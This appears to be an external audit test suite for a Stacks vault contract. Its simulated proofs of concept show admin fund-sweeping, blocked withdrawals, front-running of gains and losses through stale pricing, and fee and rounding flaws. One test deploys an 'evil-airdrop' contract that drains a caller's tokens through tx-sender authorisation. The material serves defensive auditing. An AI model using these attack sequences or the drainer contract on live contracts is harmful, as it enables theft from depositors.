// INDEPENDENT AUDIT SUITE (external review, 2026-10-07) -- not part of the owner's suite.
// Each test asserts the contract's CURRENT behavior. Tests prefixed "FINDING" pass today
// because the issue is real; when a fix lands, flip the assertion to make it a regression test.

import { describe, expect, it, beforeEach } from "vitest";
import { Cl, ClarityValue } from "@stacks/transactions";
import { appendFileSync } from "node:fs";
// measured numbers go to $AUDIT_LOG if set (the clarinet env swallows console output)
const log = (m: string) => { if (process.env.AUDIT_LOG) appendFileSync(process.env.AUDIT_LOG, m + "\n"); };

const TOKEN = "deepstack-vault-token";
const VAULT = "deepstack-vault";
const accounts = simnet.getAccounts();
const admin = accounts.get("deployer")!;
const alice = accounts.get("wallet_1")!;
const bob = accounts.get("wallet_2")!;
const mallory = accounts.get("wallet_3")!;
const STX = 1_000_000;
const WITHDRAWAL_DELAY = 11330;
const TIMELOCK_DELAY = 39660;

const num = (cv: ClarityValue): bigint => {
  let v: any = cv;
  if (v.type === "ok" || v.type === "err") v = v.value;
  return BigInt(v.value);
};
const okNum = (r: { result: ClarityValue }) => {
  if ((r.result as any).type !== "ok") throw new Error("expected ok, got " + JSON.stringify(r.result, (_, x) => (typeof x === "bigint" ? x.toString() : x)));
  const inner: any = (r.result as any).value;
  return inner.type === "uint" ? BigInt(inner.value) : 0n;
};
const errCode = (r: { result: ClarityValue }) => {
  expect((r.result as any).type).toBe("err");
  return Number(num(r.result));
};
const ro = (fn: string, args: ClarityValue[] = [], c = VAULT) => simnet.callReadOnlyFn(c, fn, args, admin).result;
const stxOf = (who: string) => simnet.getAssetsMap().get("STX")!.get(who) ?? 0n;
const vaultId = () => `${admin}.${VAULT}`;
const shares = (who: string) => num(ro("get-balance", [Cl.principal(who)], TOKEN));
const supply = () => num(ro("get-total-supply", [], TOKEN));
const valueOf = (who: string) => num(ro("assets-for-shares", [Cl.uint(shares(who))]));

const deposit = (amt: number, who: string) => simnet.callPublicFn(VAULT, "deposit", [Cl.uint(amt)], who);
const request = (sh: bigint | number, who: string) => simnet.callPublicFn(VAULT, "request-withdrawal", [Cl.uint(sh)], who);
const claim = (id: bigint | number, who: string) => simnet.callPublicFn(VAULT, "claim-withdrawal", [Cl.uint(id)], who);
const sweep = (amt: number | bigint) => simnet.callPublicFn(VAULT, "sweep-to-strategy", [Cl.uint(amt)], admin);
const ret = (amt: number | bigint) => simnet.callPublicFn(VAULT, "return-from-strategy", [Cl.uint(amt)], admin);
const mature = () => simnet.mineEmptyBlocks(WITHDRAWAL_DELAY + 1);
// full exit: request all shares, wait, claim; returns STX received
const exitAll = (who: string) => {
  const before = stxOf(who);
  const id = okNum(request(shares(who), who));
  mature();
  okNum(claim(id, who));
  return stxOf(who) - before;
};

beforeEach(() => {
  const r = simnet.callPublicFn(TOKEN, "set-vault-contract", [Cl.contractPrincipal(admin, VAULT)], admin);
  if ((r.result as any).type !== "ok") throw new Error("link failed");
});

// ============================================================================
// Admin custody: sweep-to-strategy is an un-timelocked transfer to the admin's own wallet
// ============================================================================
describe("admin trust", () => {
  it("FINDING C-1: admin can take ~100% of depositor funds in one block, with no timelock, and book it as a 'loss'", () => {
    okNum(deposit(100 * STX, alice));
    okNum(deposit(100 * STX, bob));
    const adminBefore = stxOf(admin);
    okNum(sweep(200 * STX)); // instant, not timelocked, to tx-sender==admin's own wallet
    okNum(ret(1)); // "the strategy lost everything" -- unverifiable; 1 uSTX is the minimum stx-transfer
    expect(stxOf(admin) - adminBefore).toBe(BigInt(200 * STX - 1));
    expect(num(ro("get-cumulative-realized-pnl"))).toBe(BigInt(-(200 * STX - 1)));
    // depositors' claim is now worth ~nothing
    expect(valueOf(alice)).toBeLessThan(1n * BigInt(STX));
    expect(valueOf(bob)).toBeLessThan(1n * BigInt(STX));
  });

  it("FINDING C-1b: admin need never return at all -- capital-at-strategy is just a number", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    // Alice's shares still 'value' at 100 STX on paper, but nothing is redeemable
    expect(valueOf(alice)).toBeGreaterThanOrEqual(BigInt(99 * STX));
    expect(errCode(request(1n, alice))).toBe(107); // even 1 share: INSUFFICIENT-LIQUIDITY
  });

  it("FINDING H-1: 'withdrawals cannot be paused' is false in effect -- sweeping 100% of free balance blocks every new withdrawal request indefinitely", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    simnet.mineEmptyBlocks(50_000); // > 7 days of blocks
    expect(errCode(request(shares(alice), alice))).toBe(107);
    // and repeated sweep/return in back-to-back blocks keeps the window ~closed even when 'returned'
    okNum(ret(100 * STX));
    okNum(sweep(num(ro("get-free-balance")))); // the very next block
    expect(errCode(request(shares(alice), alice))).toBe(107);
  });

  it("FINDING H-2: the 7-day timelock gives no exit if capital is swept -- fee raised to 20% lands on depositors who could not leave", () => {
    okNum(deposit(100 * STX, alice));
    okNum(simnet.callPublicFn(VAULT, "queue-fee-bps", [Cl.uint(2000)], admin));
    okNum(sweep(100 * STX)); // same moment
    // Alice notices on day 1 and tries to exit every ~day of the timelock window: always refused
    for (let d = 0; d < 7; d++) {
      expect(errCode(request(shares(alice), alice))).toBe(107);
      simnet.mineEmptyBlocks(Math.floor(TIMELOCK_DELAY / 7));
    }
    simnet.mineEmptyBlocks(10);
    okNum(simnet.callPublicFn(VAULT, "confirm-fee-bps", [], mallory)); // anyone can confirm
    expect(num(ro("get-performance-fee-bps"))).toBe(2000n);
    okNum(ret(110 * STX)); // gain of 10 STX charged at 20%, not the 10% in force when she deposited
    const feeShares = shares(admin);
    expect(num(ro("assets-for-shares", [Cl.uint(feeShares)]))).toBeGreaterThan(BigInt(1.9 * STX));
  });

  it("FINDING L-3: queue-* emits no print event -- users must poll getters to notice a pending change", () => {
    const r = simnet.callPublicFn(VAULT, "queue-admin-change", [Cl.principal(mallory)], admin);
    expect((r.result as any).type).toBe("ok");
    expect(r.events.length).toBe(0);
  });

  it("admin succession while capital is deployed: only the NEW admin can return it, but the OLD admin holds the STX", () => {
    okNum(deposit(10 * STX, alice));
    okNum(sweep(10 * STX)); // STX now in old admin's wallet
    okNum(simnet.callPublicFn(VAULT, "queue-admin-change", [Cl.principal(bob)], admin));
    simnet.mineEmptyBlocks(TIMELOCK_DELAY + 1);
    okNum(simnet.callPublicFn(VAULT, "accept-admin-change", [], bob));
    expect(errCode(ret(10 * STX))).toBe(100); // old admin can no longer return it
    // new admin must source the STX themselves; contract has no record of who holds it
    okNum(simnet.callPublicFn(VAULT, "return-from-strategy", [Cl.uint(10 * STX)], bob));
  });
});

// ============================================================================
// Stale NAV: assets = ledger + capital-at-strategy AT COST; PnL is only seen on return, and
// the withdrawal price is locked at REQUEST time -- so the 2-day delay doesn't protect anyone.
// ============================================================================
describe("stale-NAV / ordering", () => {
  it("FINDING H-3: an informed depositor entering just before a profitable return captures existing holders' profit", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    // strategy has (off-chain, visible on the operator's dashboard / in the mempool) made +20 STX
    okNum(deposit(100 * STX, mallory)); // priced at cost basis 1:1 -- the +20 is invisible
    okNum(ret(120 * STX));
    const malloryGot = exitAll(mallory);
    const aliceGot = exitAll(alice);
    // fair: Mallory ~100, Alice ~118 (100 + 20 - 10% fee). Actual:
    expect(malloryGot).toBeGreaterThan(BigInt(108 * STX));
    expect(aliceGot).toBeLessThan(BigInt(110 * STX));
    log(`H-3 gain front-run: mallory=${Number(malloryGot) / STX} alice=${Number(aliceGot) / STX} (fair ~100 / ~118)`);
  });

  it("FINDING H-3b: a holder who sees a loss coming locks the pre-loss price at request time and pushes the loss onto others", () => {
    okNum(deposit(100 * STX, alice));
    okNum(deposit(100 * STX, mallory));
    okNum(sweep(100 * STX)); // 100 deployed, 100 free
    // strategy is down 50 STX (unrealized). Mallory requests before the admin books it:
    const id = okNum(request(shares(mallory), mallory)); // locks 100 STX
    okNum(ret(50 * STX));
    mature();
    const before = stxOf(mallory);
    okNum(claim(id, mallory));
    const malloryGot = stxOf(mallory) - before;
    const aliceGot = valueOf(alice); // (a full exit is blocked by L-4 below; value is what she's owed)
    // fair: each ~75. Actual: Mallory 100, Alice ~50
    expect(malloryGot).toBeGreaterThanOrEqual(BigInt(99 * STX));
    expect(aliceGot).toBeLessThan(BigInt(51 * STX));
    log(`H-3b loss front-run: mallory=${Number(malloryGot) / STX} alice=${Number(aliceGot) / STX} (fair ~75 / ~75)`);
  });
});

// ============================================================================
// Performance fee
// ============================================================================
describe("performance fee", () => {
  it("FINDING L-1: fee shares are minted at the post-gain price without adding fee assets, so fee recipient receives slightly LESS than fee-bps of the gain", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(200 * STX)); // +100 gain -> fee should be 10 STX
    const feeValue = valueOf(admin);
    expect(feeValue).toBeLessThan(BigInt(10 * STX));
    log(`L-1 fee value=${Number(feeValue) / STX} STX vs 10 STX nominal`);
  });

  it("FINDING M-1: the high-water mark is absolute vault-level STX, not per-share -- new depositors' profit can escape the fee", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(50 * STX)); // cum -50, hwm 0
    okNum(deposit(400 * STX, bob)); // Bob enters at the depressed price
    okNum(sweep(450 * STX));
    okNum(ret(500 * STX)); // +50 gain: Bob's share of this is real new profit for him
    expect(shares(admin)).toBe(0n); // ...but no fee at all, since cum pnl only climbed back to 0
    const bobGot = exitAll(bob);
    expect(bobGot).toBeGreaterThan(BigInt(440 * STX)); // Bob ~+44 profit, fee-free
  });

  it("FINDING M-1b: ...and holders who are still under their own entry price can be charged fee on someone else's gain", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(110 * STX)); // cum +10, hwm +10, price 1.1, fee ~1 STX
    const feeAfter1 = shares(admin);
    okNum(deposit(200 * STX, bob)); // Bob enters at ~1.1
    okNum(sweep(num(ro("get-free-balance"))));
    okNum(ret(num(ro("get-capital-at-strategy")) - BigInt(40 * STX))); // -40: cum -30, price drops
    // Alice exits (realising most of the drop); Mallory enters low
    exitAll(alice);
    okNum(deposit(150 * STX, mallory));
    okNum(sweep(num(ro("get-free-balance"))));
    okNum(ret(num(ro("get-capital-at-strategy")) + BigInt(45 * STX))); // +45: cum +15 > hwm 10 -> fee on 5
    expect(shares(admin)).toBeGreaterThan(feeAfter1);
    // Bob is still below his own entry value (~300) yet bore part of that fee
    expect(valueOf(bob)).toBeLessThan(BigInt(200 * STX));
    log(`M-1b bob value=${Number(valueOf(bob)) / STX} (deposited 200), fee shares=${shares(admin)}`);
  });

  it("zero-PnL round trip (what was exercised on mainnet) charges no fee and moves no price", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(70 * STX));
    okNum(ret(70 * STX));
    expect(shares(admin)).toBe(0n);
    expect(valueOf(alice)).toBe(BigInt(100 * STX));
  });
});

// ============================================================================
// Dust / rounding
// ============================================================================
describe("dust and rounding", () => {
  it("FINDING L-2: after a loss, a request whose shares round to 0 uSTX is accepted but can never be claimed (stx-transfer u0 fails) -- shares stuck in the vault forever", () => {
    okNum(deposit(10 * STX, alice));
    okNum(sweep(10 * STX));
    okNum(ret(5 * STX)); // price ~0.5 uSTX/share
    expect(num(ro("assets-for-shares", [Cl.uint(1)]))).toBe(0n);
    const id = okNum(request(1n, alice));
    mature();
    expect(errCode(claim(id, alice))).toBe(3); // stx-transfer? of zero
    expect(shares(vaultId())).toBe(1n); // escrowed forever
  });

  it("FINDING L-4: virtual offset is not value-neutral -- after a loss, the sum of holders' claims exceeds real STX, so the last holder cannot redeem all their shares", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(50 * STX));
    const owed = valueOf(alice); // sole holder
    expect(owed).toBeGreaterThan(num(ro("get-total-stx-balance")));
    expect(errCode(request(shares(alice), alice))).toBe(107);
    log(`L-4 sole holder owed=${Number(owed) / STX} vs vault holds 50`);
  });

  it("a 1-share deposit after a gain is rejected (no zero-share mint); rounding always favours the vault", () => {
    okNum(deposit(10 * STX, alice));
    okNum(sweep(10 * STX));
    okNum(ret(20 * STX));
    expect(errCode(deposit(1, bob))).toBe(105);
    const got = (() => { okNum(deposit(7 * STX + 3, bob)); return exitAll(bob); })();
    expect(got).toBeLessThanOrEqual(BigInt(7 * STX + 3));
    expect(got).toBeGreaterThanOrEqual(BigInt(7 * STX + 3 - 2));
  });

  it("first-depositor / donation attack: attacker gains nothing, victim loses nothing", () => {
    okNum(deposit(1 * STX, mallory));
    simnet.transferSTX(1_000 * STX, vaultId(), mallory); // donation, invisible to ledger
    okNum(deposit(50 * STX, alice));
    expect(exitAll(alice)).toBeGreaterThanOrEqual(BigInt(50 * STX - 1));
    expect(exitAll(mallory)).toBeLessThanOrEqual(BigInt(1 * STX));
  });
});

// ============================================================================
// Clarity authorization: tx-sender-based token transfer / deposit via an intermediary
// ============================================================================
describe("clarity authorization", () => {
  it("INFO: any contract a holder calls can move their dsSTX / deposit their STX (tx-sender auth); only wallet post-conditions protect", () => {
    okNum(deposit(10 * STX, alice));
    const src = `(define-public (claim-airdrop)
      (let ((bal (unwrap-panic (contract-call? '${admin}.${TOKEN} get-balance tx-sender))))
        (contract-call? '${admin}.${TOKEN} transfer bal tx-sender '${mallory} none)))`;
    simnet.deployContract("evil-airdrop", src, { clarityVersion: 3 }, mallory);
    simnet.callPublicFn(`${mallory}.evil-airdrop`, "claim-airdrop", [], alice);
    expect(shares(alice)).toBe(0n);
    expect(shares(mallory)).toBe(BigInt(10 * STX));
  });

  it("an intermediary contract cannot redirect a withdrawal payout: owner is the signer, payout goes to the owner", () => {
    okNum(deposit(10 * STX, alice));
    const src = `(define-public (go (s uint)) (contract-call? '${admin}.${VAULT} request-withdrawal s))`;
    simnet.deployContract("relay", src, { clarityVersion: 3 }, mallory);
    const id = okNum(simnet.callPublicFn(`${mallory}.relay`, "go", [Cl.uint(10 * STX)], alice));
    mature();
    expect(errCode(claim(id, mallory))).toBe(109);
    okNum(claim(id, alice));
  });

  it("mint/burn cannot be reached through a contract that the signer calls (contract-caller gate)", () => {
    const src = `(define-public (mint) (contract-call? '${admin}.${TOKEN} mint-for-vault u1000000 tx-sender))`;
    simnet.deployContract("minter", src, { clarityVersion: 3 }, admin);
    expect(errCode(simnet.callPublicFn(`${admin}.minter`, "mint", [], admin))).toBe(202);
  });
});

// ============================================================================
// Deterministic pseudo-random sequence testing with invariants
// ============================================================================
describe("sequence fuzz (seeded)", () => {
  const rng = (seed: number) => () => ((seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff);

  for (const seed of [1, 7, 42, 1337, 9001, 31337]) {
    it(`invariants hold for seed ${seed}`, () => {
      const r = rng(seed);
      const users = [alice, bob, mallory];
      const deposited = new Map<string, bigint>(users.map((u) => [u, 0n]));
      const received = new Map<string, bigint>(users.map((u) => [u, 0n]));
      const open: { id: bigint; who: string }[] = [];
      let netStrategy = 0n; // returned - swept

      okNum(deposit(5 * STX, alice));
      deposited.set(alice, BigInt(5 * STX));

      for (let step = 0; step < 60; step++) {
        const op = Math.floor(r() * 6);
        const who = users[Math.floor(r() * users.length)];
        if (op === 0) {
          const amt = Math.floor(r() * 40 * STX) + 1;
          const res = deposit(amt, who);
          if ((res.result as any).type === "ok") deposited.set(who, deposited.get(who)! + BigInt(amt));
        } else if (op === 1 && shares(who) > 0n) {
          const sh = (shares(who) * BigInt(Math.floor(r() * 100) + 1)) / 100n;
          const res = request(sh, who);
          if ((res.result as any).type === "ok") open.push({ id: num(res.result), who });
        } else if (op === 2 && open.length) {
          simnet.mineEmptyBlocks(WITHDRAWAL_DELAY + 1);
          for (const o of open.splice(0)) {
            const b = stxOf(o.who);
            const res = claim(o.id, o.who);
            if ((res.result as any).type === "ok") received.set(o.who, received.get(o.who)! + (stxOf(o.who) - b));
          }
        } else if (op === 3 && num(ro("get-capital-at-strategy")) === 0n) {
          const free = num(ro("get-free-balance"));
          if (free > 0n) {
            const amt = (free * BigInt(Math.floor(r() * 100) + 1)) / 100n;
            if (amt > 0n && (sweep(amt).result as any).type === "ok") netStrategy -= amt;
          }
        } else if (op === 4) {
          const dep = num(ro("get-capital-at-strategy"));
          if (dep > 0n) {
            const amt = (dep * BigInt(Math.floor(r() * 60) + 70)) / 100n || 1n; // -30%..+30%
            if ((ret(amt).result as any).type === "ok") netStrategy += amt;
          }
        } else if (op === 5) {
          simnet.mineEmptyBlocks(Math.floor(r() * 500));
        }

        // ---- invariants after every step ----
        const bal = num(ro("get-total-stx-balance"));
        const pending = num(ro("get-total-pending-withdrawals"));
        const actual = stxOf(vaultId());
        expect(pending).toBeLessThanOrEqual(bal); // free balance never negative
        expect(bal).toBeLessThanOrEqual(actual); // ledger never exceeds real STX
        const holders = [...users, admin, vaultId()];
        expect(holders.reduce((s, h) => s + shares(h), 0n)).toBe(supply()); // supply == sum of balances
        // conservation: STX in vault ledger + at strategy == deposits + strategy net - payouts
        const totalIn = [...deposited.values()].reduce((a, b) => a + b, 0n);
        const totalOut = [...received.values()].reduce((a, b) => a + b, 0n);
        expect(bal).toBe(totalIn + netStrategy - totalOut);
        // escrowed shares == shares of unclaimed requests
        // (requests store shares; sum over open ids)
        let esc = 0n;
        for (const o of open) {
          const req: any = ro("get-withdrawal-request", [Cl.uint(o.id)]);
          esc += BigInt(req.value.value.value.shares.value);
        }
        expect(shares(vaultId())).toBe(esc);
      }
    });
  }

  it("with NO strategy activity, any deposit/withdraw interleaving returns each user <= deposit and >= deposit minus rounding", () => {
    const r = rng(2024);
    const users = [alice, bob, mallory];
    for (const u of users) okNum(deposit(Math.floor(r() * 100 * STX) + STX, u));
    const dep = new Map(users.map((u) => [u, BigInt(0)]));
    // recompute deposits from share balances at 1:1
    for (const u of users) dep.set(u, shares(u));
    for (const u of users) {
      const got = exitAll(u);
      expect(got).toBeLessThanOrEqual(dep.get(u)!);
      expect(got).toBeGreaterThanOrEqual(dep.get(u)! - 2n);
    }
  });
});

// ============================================================================
// End-to-end scenarios (realized PnL only -- the fair case) + fee lifecycle
// ============================================================================
describe("E2E", () => {
  const f = (x: bigint) => (Number(x) / STX).toFixed(6);
  const feeVal = () => valueOf(admin);

  it("E2E-1 Alice solo: deposit -> profit -> partial withdraw -> loss -> full withdraw; value conserved", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(120 * STX)); // +20, nominal fee 2
    const v1 = valueOf(alice);
    const got1 = (() => { const id = okNum(request(shares(alice) / 2n, alice)); mature(); const b = stxOf(alice); okNum(claim(id, alice)); return stxOf(alice) - b; })();
    okNum(sweep(num(ro("get-free-balance"))));
    const dep = num(ro("get-capital-at-strategy"));
    okNum(ret((dep * 80n) / 100n)); // -20% loss
    const owed = valueOf(alice);
    const fee = feeVal();
    const vaultHeld = num(ro("get-total-stx-balance"));
    log(`E2E-1 alice value after +20: ${f(v1)}; partial got ${f(got1)}; owed after -20%: ${f(owed)}; fee-holder value ${f(fee)}; vault holds ${f(vaultHeld)}`);
    // conservation: what's left = alice's claim + fee holder's claim + virtual-share residue
    expect(owed + fee).toBeGreaterThan(vaultHeld - BigInt(STX));
    expect(got1).toBeGreaterThan(BigInt(58.9 * STX));
  });

  it("E2E-2 Bob joins AFTER a realized profit: neither captures the other's value", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(120 * STX)); // realized before Bob arrives
    okNum(deposit(100 * STX, bob));
    const aliceBefore = valueOf(alice), bobBefore = valueOf(bob);
    okNum(sweep(num(ro("get-free-balance"))));
    okNum(ret((num(ro("get-capital-at-strategy")) * 110n) / 100n)); // +10%
    const a = valueOf(alice), b = valueOf(bob);
    log(`E2E-2 alice ${f(aliceBefore)} -> ${f(a)} (${((Number(a) / Number(aliceBefore) - 1) * 100).toFixed(3)}%), bob ${f(bobBefore)} -> ${f(b)} (${((Number(b) / Number(bobBefore) - 1) * 100).toFixed(3)}%)`);
    // both earn the same percentage (net of fee) -- fair
    expect(Math.abs(Number(a) / Number(aliceBefore) - Number(b) / Number(bobBefore))).toBeLessThan(1e-4);
  });

  it("E2E-3 Bob joins AFTER a realized loss: same percentage outcome, no cross-subsidy", () => {
    okNum(deposit(100 * STX, alice));
    okNum(sweep(100 * STX));
    okNum(ret(80 * STX));
    okNum(deposit(100 * STX, bob));
    const a0 = valueOf(alice), b0 = valueOf(bob);
    okNum(sweep(num(ro("get-free-balance"))));
    okNum(ret((num(ro("get-capital-at-strategy")) * 90n) / 100n));
    const a = valueOf(alice), b = valueOf(bob);
    log(`E2E-3 alice ${f(a0)} -> ${f(a)}, bob ${f(b0)} -> ${f(b)}`);
    expect(Math.abs(Number(a) / Number(a0) - Number(b) / Number(b0))).toBeLessThan(1e-4);
  });

  it("FEE LIFECYCLE: deposit, profit, partial withdraw, profit, withdraw, loss, recover-to-high, new profit", () => {
    const pnl = () => num(ro("get-cumulative-realized-pnl"));
    const hwm = () => num(ro("get-high-water-mark"));
    const rows: string[] = [];
    const step = (label: string) => rows.push(`${label}: pnl=${f(pnl())} hwm=${f(hwm())} feeShares=${shares(admin)} feeValue=${f(feeVal())}`);
    const roundTrip = (pct: bigint) => { okNum(sweep(num(ro("get-free-balance")))); okNum(ret((num(ro("get-capital-at-strategy")) * pct) / 100n)); };
    okNum(deposit(200 * STX, alice)); step("1 deposit 200");
    roundTrip(110n); step("2 +10%"); const s2 = shares(admin);
    expect(s2).toBeGreaterThan(0n);
    { const id = okNum(request(shares(alice) / 2n, alice)); mature(); okNum(claim(id, alice)); } step("3 partial withdraw 50%");
    expect(shares(admin)).toBe(s2); // withdrawal does not trigger a fee
    roundTrip(110n); step("4 +10%"); const s4 = shares(admin);
    expect(s4).toBeGreaterThan(s2);
    { const id = okNum(request(shares(alice) / 2n, alice)); mature(); okNum(claim(id, alice)); } step("5 withdraw half again");
    roundTrip(80n); step("6 -20%"); expect(shares(admin)).toBe(s4);
    // recover exactly to prior pnl high
    const need = hwm() - pnl();
    okNum(sweep(num(ro("get-free-balance")))); okNum(ret(num(ro("get-capital-at-strategy")) + need)); step("7 recover to HWM");
    expect(shares(admin)).toBe(s4); // no double charge on recovery
    roundTrip(105n); step("8 +5% new high"); expect(shares(admin)).toBeGreaterThan(s4);
    log("FEE LIFECYCLE\n  " + rows.join("\n  "));
  });
});
